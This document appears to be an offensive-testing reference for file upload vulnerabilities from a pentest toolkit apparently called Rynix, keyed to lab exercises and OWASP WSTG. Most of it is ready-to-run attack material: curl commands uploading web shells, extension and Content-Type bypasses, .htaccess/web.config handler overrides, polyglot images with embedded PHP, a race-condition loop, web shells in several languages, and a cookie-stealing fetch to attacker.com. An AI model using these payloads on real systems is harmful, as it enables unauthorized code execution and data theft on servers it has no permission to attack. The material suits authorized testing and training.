---
id: PS-UPLOAD
category: File upload vulnerabilities
lab_count: 7
wstg_refs: [WSTG-BUSL-08, WSTG-BUSL-09]
---

# File Upload: Attack Technique Reference

File upload vulnerabilities occur when a web application allows users to upload files without adequately validating the file type, content, name, or size. If the uploaded file is stored in a web-accessible directory and the server is configured to execute it, an attacker can upload a web shell to achieve remote code execution. Even without execution, file uploads can enable cross-site scripting, denial of service, server-side request forgery, and directory traversal attacks.

---

## 1. Detection

### 1A. Identify Upload Endpoints

Look for file upload functionality across the application:

- Profile picture / avatar upload
- Document upload (resumes, attachments, imports)
- Image galleries or media libraries
- File import features (CSV, XML, JSON)
- Support ticket attachments
- Chat message attachments
- CMS content editors (WYSIWYG with image upload)
- API endpoints accepting `multipart/form-data`
- `PUT` method support (check with `OPTIONS` request)

```bash
# Check for PUT method support
curl -sk -X OPTIONS https://TARGET/ -D-
# Look for: Allow: GET, POST, PUT, DELETE, OPTIONS

# Test PUT upload
curl -sk -X PUT -d '<?php system($_GET["c"]); ?>' https://TARGET/uploads/shell.php
```

### 1B. Analyze Existing Validation

Upload a legitimate file first, then probe the validation:

```bash
# 1. Upload a normal image to establish baseline
curl -sk -X POST -F "file=@legit.jpg" https://TARGET/upload

# 2. Note: response format, upload path, filename handling, size limits

# 3. Try uploading a PHP file
curl -sk -X POST -F "file=@shell.php" https://TARGET/upload
# Check: rejected at client-side (JS), server-side, or accepted?

# 4. Check where files are stored
# Look in response for URL, check /uploads/, /files/, /images/, /media/
curl -sk https://TARGET/files/legit.jpg
```

### 1C. Determine Validation Type

| Validation Type | How to Identify | Bypass Strategy |
|----------------|-----------------|-----------------|
| No validation | PHP file accepted, executes | Direct web shell upload |
| Client-side JS only | Intercept shows server accepts all types | Bypass with curl / Rynix |
| Content-Type check | Changing header allows upload | Content-Type manipulation |
| Extension blacklist | Common extensions blocked, alternatives accepted | Alternative extensions |
| Extension whitelist | Only specific extensions allowed | Double extension, null byte |
| Magic bytes check | File content inspected | Polyglot file |
| File content scan | Deep content analysis | Embed payload in metadata |
| Upload + async delete | File briefly accessible | Race condition |

---

## 2. Techniques

### 2A. Unrestricted Upload (No Validation)

When the server accepts any file type and stores it in an executable directory, upload a web shell directly.

```bash
# Create a simple PHP web shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Upload it
curl -sk -X POST -F "file=@shell.php" -H "Cookie: session=TOKEN" https://TARGET/upload

# Execute commands
curl -sk "https://TARGET/files/shell.php?c=whoami"
curl -sk "https://TARGET/files/shell.php?c=cat+/etc/passwd"
curl -sk "https://TARGET/files/shell.php?c=cat+/home/carlos/secret"
```

> Lab refs: PS-UPLOAD-01

### 2B. Content-Type Bypass

Many servers validate the `Content-Type` header in the multipart upload rather than the actual file content. The server checks that `Content-Type` is an allowed MIME type (e.g., `image/jpeg`) but does not verify the file body matches.

```bash
# Upload PHP file with image Content-Type
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;type=image/jpeg" \
  https://TARGET/upload

# Manual multipart construction (for fine-grained control)
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -H "Content-Type: multipart/form-data; boundary=----Boundary" \
  -d '------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["c"]); ?>
------Boundary--' \
  https://TARGET/upload
```

**Allowed MIME types to try:**

```
image/jpeg
image/png
image/gif
image/svg+xml
application/octet-stream
text/plain
```

> Lab refs: PS-UPLOAD-02

### 2C. Path Traversal in Filename

When uploaded files are stored in a non-executable directory (e.g., `/uploads/`), use directory traversal sequences in the filename to escape to an executable directory.

```bash
# Basic directory traversal
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;filename=../shell.php" \
  https://TARGET/upload

# URL-encoded traversal (when ../ is stripped)
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;filename=..%2fshell.php" \
  https://TARGET/upload

# Double URL-encoded
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;filename=..%252fshell.php" \
  https://TARGET/upload

# Multiple levels up
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;filename=../../shell.php" \
  https://TARGET/upload

# Windows path traversal
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;filename=..\\shell.php" \
  https://TARGET/upload
```

After upload, the shell may be accessible at the parent directory level:
```bash
curl -sk "https://TARGET/files/../shell.php?c=whoami"
# or simply
curl -sk "https://TARGET/shell.php?c=whoami"
```

> Lab refs: PS-UPLOAD-03

### 2D. Extension Blacklist Bypass

When the server blocks known dangerous extensions (`.php`, `.jsp`, `.asp`), bypass with alternative extensions or by uploading server configuration files that reclassify extensions.

**Apache .htaccess override:**

Upload a `.htaccess` file that maps a custom extension to the PHP handler:

```bash
# Create .htaccess
echo 'AddType application/x-httpd-php .pwn' > .htaccess

# Upload .htaccess to the upload directory
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@.htaccess;type=text/plain" \
  https://TARGET/upload

# Upload shell with custom extension
echo '<?php system($_GET["c"]); ?>' > shell.pwn
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.pwn;type=image/jpeg" \
  https://TARGET/upload

# Execute
curl -sk "https://TARGET/files/shell.pwn?c=whoami"
```

**IIS web.config override:**

```xml
<!-- web.config that maps .pwn to ASP handler -->
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="pwn" path="*.pwn" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

> Lab refs: PS-UPLOAD-04

### 2E. Extension Obfuscation

When the blacklist catches common alternatives, obfuscate the extension to bypass string matching.

**Obfuscation techniques:**

```bash
# Null byte injection (PHP < 5.3.4, older frameworks)
# The null byte terminates the string for the filesystem but not the validator
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"

# Double extension (server may execute based on first executable extension)
filename="shell.php.jpg"
filename="shell.jpg.php"

# Case variation (blacklist may be case-sensitive)
filename="shell.pHp"
filename="shell.PHP"
filename="shell.Php"

# Trailing characters (may be stripped by filesystem but not validator)
filename="shell.php."
filename="shell.php "
filename="shell.php....."
filename="shell.php;.jpg"

# URL encoding of the dot
filename="shell%2Ephp"

# Semicolon (Apache may stop parsing at semicolon)
filename="shell.php;jpg"

# Unicode/overlong encoding
filename="shell.ph\u0070"

# Strip-bypass (if validator removes .php once)
filename="shell.p.phphp"    # After stripping .php → shell.php
filename="shell.pphphp"     # After stripping php → shell.php
```

> Lab refs: PS-UPLOAD-05

### 2F. Content Validation Bypass (Polyglot Files)

When the server validates file content (magic bytes, image dimensions, EXIF data), create a polyglot file that is both a valid image and contains executable code.

**PHP in EXIF metadata (using ExifTool):**

```bash
# Inject PHP code into JPEG EXIF comment
exiftool -Comment='<?php system($_GET["c"]); ?>' legit.jpg -o polyglot.php.jpg

# Or inject into DocumentName field
exiftool -DocumentName='<?php system($_GET["c"]); ?>' legit.jpg -o polyglot.php.jpg

# Upload the polyglot
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@polyglot.php.jpg" \
  https://TARGET/upload
```

**Manual magic bytes prepend:**

```bash
# Prepend JPEG magic bytes (FF D8 FF E0) to a PHP file
printf '\xFF\xD8\xFF\xE0<?php system($_GET["c"]); ?>' > polyglot.php.jpg

# Prepend GIF magic bytes
printf 'GIF89a<?php system($_GET["c"]); ?>' > polyglot.php.gif

# Prepend PNG magic bytes
printf '\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>' > polyglot.php.png
```

**SVG with embedded script (for XSS):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script>alert(document.cookie)</script>
  <rect width="100" height="100" fill="green"/>
</svg>
```

**SVG with SSRF (for server-side rendering):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

> Lab refs: PS-UPLOAD-06

### 2G. Race Condition Upload

When the server uploads the file, validates it asynchronously, and deletes it if invalid, there is a brief window where the file exists on disk before deletion. A rapid upload-then-access sequence can execute the file in that window.

**Attack flow:**

1. Upload the malicious file
2. Immediately send multiple requests to access the uploaded file
3. If one request arrives during the validation window, the file executes

```bash
# Upload the shell
curl -sk -X POST \
  -H "Cookie: session=TOKEN" \
  -F "file=@shell.php;type=image/jpeg" \
  https://TARGET/upload &

# Immediately try to access it (race the validator)
for i in $(seq 1 100); do
  curl -sk "https://TARGET/files/shell.php?c=whoami" &
done
wait
```

**Using fuzz-cli parameter sweep or turbo-intruder for precise timing:**

Send the upload request and the access request in the same TCP connection group with minimal delay between them. Turbo-intruder's single-packet attack sends multiple requests in a single TCP packet for maximum speed.

**URL-based upload race condition:**

When the server fetches a file from a URL instead of receiving a direct upload, the file is temporarily stored on the server's filesystem. If the URL points to an attacker-controlled server that responds slowly, the window is extended:

```bash
# Attacker's server delivers the PHP file with a 10-second delay
# Meanwhile, brute-force the temporary filename in the sandbox directory
```

> Lab refs: PS-UPLOAD-07

---

## 3. Web Shell Payloads

### 3A. PHP Web Shells

```php
// Minimal command execution
<?php system($_GET["c"]); ?>

// Alternative functions (if system() is disabled)
<?php echo shell_exec($_GET["c"]); ?>
<?php echo exec($_GET["c"]); ?>
<?php passthru($_GET["c"]); ?>
<?php echo `$_GET["c"]`; ?>
<?php $a=$_GET["c"];echo `$a`; ?>

// File read only
<?php echo file_get_contents($_GET["f"]); ?>

// POST-based (avoids logging in access logs)
<?php system($_POST["c"]); ?>

// Eval-based (for code execution rather than OS commands)
<?php eval($_GET["c"]); ?>

// Base64-encoded payload (bypass WAF keyword detection)
<?php system(base64_decode($_GET["c"])); ?>
// Usage: ?c=d2hvYW1p (base64 of "whoami")

// One-liner that reads a specific file
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### 3B. JSP Web Shells (Java/Tomcat)

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("c");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) out.println(line);
%>

// Minimal JSP
<%= Runtime.getRuntime().exec(request.getParameter("c")) %>
```

### 3C. ASP/ASPX Web Shells

```asp
<!-- Classic ASP -->
<%
Set shell = CreateObject("WScript.Shell")
Set exec = shell.Exec("cmd /c " & Request("c"))
Response.Write(exec.StdOut.ReadAll())
%>
```

```aspx
<!-- ASPX -->
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request["c"];
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.UseShellExecute = false;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### 3D. Python Web Shells (CGI)

```python
#!/usr/bin/env python3
import cgi, subprocess
params = cgi.FieldStorage()
cmd = params.getvalue('c', 'id')
print("Content-Type: text/plain\n")
print(subprocess.check_output(cmd, shell=True).decode())
```

### 3E. Server-Side Includes (SSI)

```html
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
```

---

## 4. Extension Bypass Reference

### 4A. PHP Executable Extensions

| Extension | Server/Config | Notes |
|-----------|--------------|-------|
| `.php` | Default | Standard PHP handler |
| `.php3` | Apache (legacy) | PHP 3 compatibility |
| `.php4` | Apache (legacy) | PHP 4 compatibility |
| `.php5` | Apache | PHP 5 explicit handler |
| `.php7` | Apache | PHP 7 explicit handler |
| `.pht` | Apache | Alternate PHP handler |
| `.phtml` | Apache | PHP-HTML hybrid |
| `.phar` | Apache | PHP archive format |
| `.phps` | Apache (misc) | PHP source (may execute) |
| `.pgif` | Custom config | PHP-GIF hybrid handler |
| `.shtml` | Apache (mod_include) | Server-side includes |
| `.inc` | Misconfigured | Include files sometimes parsed |

### 4B. Java Executable Extensions

| Extension | Server | Notes |
|-----------|--------|-------|
| `.jsp` | Tomcat, JBoss | Standard JSP |
| `.jspx` | Tomcat | XML-based JSP |
| `.jsw` | Tomcat (custom) | JSP worker |
| `.jsv` | Tomcat (custom) | JSP variant |
| `.jspf` | Tomcat | JSP fragment |
| `.war` | Tomcat, JBoss | Web archive (auto-deploys) |

### 4C. ASP/.NET Executable Extensions

| Extension | Server | Notes |
|-----------|--------|-------|
| `.asp` | IIS | Classic ASP |
| `.aspx` | IIS | ASP.NET |
| `.axd` | IIS | ASP.NET handler |
| `.ashx` | IIS | Generic handler |
| `.asmx` | IIS | Web service |
| `.cer` | IIS | Certificate (may execute as ASP) |
| `.asa` | IIS | ASP application file |
| `.cshtml` | IIS | Razor view engine |
| `.vbhtml` | IIS | VB Razor view |
| `.config` | IIS | Configuration (can include code) |

### 4D. Other Executable Extensions

| Extension | Server/Runtime | Notes |
|-----------|---------------|-------|
| `.cgi` | Apache (mod_cgi) | CGI scripts (any language) |
| `.pl` | Apache (mod_perl) | Perl CGI |
| `.py` | Apache (mod_python/WSGI) | Python CGI |
| `.rb` | Passenger | Ruby scripts |
| `.cfm` | ColdFusion | ColdFusion Markup |
| `.cfc` | ColdFusion | ColdFusion Component |

---

## 5. Testing Methodology

### 5A. Systematic Validation Bypass Escalation

Test upload validation in order from simplest bypass to most complex. Stop when one succeeds.

```
Step 1: Direct Upload
  Upload shell.php with no modifications
  If accepted → execute immediately
  If rejected → proceed to Step 2

Step 2: Content-Type Bypass
  Upload shell.php with Content-Type: image/jpeg
  If accepted → execute
  If rejected → proceed to Step 3

Step 3: Alternative Extensions
  Try: .php5, .phtml, .phar, .phps, .pht, .php7
  For each, try with Content-Type: image/jpeg
  If any accepted → execute
  If all rejected → proceed to Step 4

Step 4: Extension Obfuscation
  Try: shell.php.jpg, shell.php%00.jpg, shell.pHp, shell.php., shell.p.phphp
  If any accepted → execute
  If all rejected → proceed to Step 5

Step 5: Server Config Upload
  Upload .htaccess (Apache) or web.config (IIS) to remap an allowed extension
  Then upload shell with the remapped extension
  If accepted → execute
  If rejected → proceed to Step 6

Step 6: Path Traversal
  Upload with filename: ../shell.php, ..%2fshell.php, ..%252fshell.php
  Check if shell is accessible in parent directory
  If accessible → execute
  If rejected → proceed to Step 7

Step 7: Polyglot File
  Create polyglot (valid image + PHP code in EXIF/comment)
  Upload as .php.jpg or with Content-Type: image/jpeg
  If accepted and PHP parsed → execute
  If rejected → proceed to Step 8

Step 8: Race Condition
  Upload shell.php with rapid concurrent access requests
  If any access request succeeds before deletion → execute
  If all fail → upload validation is robust for this endpoint
```

### 5B. Post-Upload Verification

After a successful upload, verify execution:

```bash
# 1. Find the uploaded file URL (check response, common paths)
curl -sk https://TARGET/files/shell.php
curl -sk https://TARGET/uploads/shell.php
curl -sk https://TARGET/images/shell.php
curl -sk https://TARGET/avatars/shell.php
curl -sk https://TARGET/media/shell.php

# 2. Test command execution
curl -sk "https://TARGET/files/shell.php?c=id"
curl -sk "https://TARGET/files/shell.php?c=whoami"

# 3. Read target files
curl -sk "https://TARGET/files/shell.php?c=cat+/home/carlos/secret"
curl -sk "https://TARGET/files/shell.php?c=cat+/etc/passwd"

# 4. If command execution fails, try file read shell
# Upload: <?php echo file_get_contents('/home/carlos/secret'); ?>
curl -sk https://TARGET/files/read.php
```

### 5C. Upload via Alternative Vectors

If standard upload forms are secured, check for alternative upload paths:

```bash
# PUT method upload
curl -sk -X PUT -d '<?php system($_GET["c"]); ?>' \
  https://TARGET/uploads/shell.php

# MOVE/COPY methods (WebDAV)
curl -sk -X MOVE \
  -H "Destination: https://TARGET/uploads/shell.php" \
  https://TARGET/uploads/legit.jpg

# multipart via API endpoint
curl -sk -X POST \
  -H "Content-Type: multipart/form-data" \
  -F "avatar=@shell.php;type=image/jpeg" \
  https://TARGET/api/v1/profile/avatar

# Base64-encoded upload via JSON API
curl -sk -X POST \
  -H "Content-Type: application/json" \
  -d '{"filename":"shell.php","content":"PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg=="}' \
  https://TARGET/api/upload
```

### 5D. Non-RCE Upload Attacks

When code execution is not possible, uploaded files can still be weaponized:

```bash
# Stored XSS via SVG
# Upload: <svg><script>alert(document.cookie)</script></svg> as profile.svg

# Stored XSS via HTML file
# Upload: <html><script>fetch('https://attacker.com/?c='+document.cookie)</script></html>

# XXE via uploaded XML/DOCX/XLSX
# Upload XML with external entity referencing internal files

# SSRF via SVG with external image reference
# Upload SVG with <image xlink:href="http://internal-server/"> for server-side rendering

# DoS via decompression bomb (zip bomb)
# Upload a small file that expands to gigabytes when processed

# Path traversal to overwrite config files
# Upload with filename ../../config/database.yml to overwrite config
```
## Rynix workflow

1. `get_technique_guide` for `file-upload` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `record_finding`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `record_finding`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

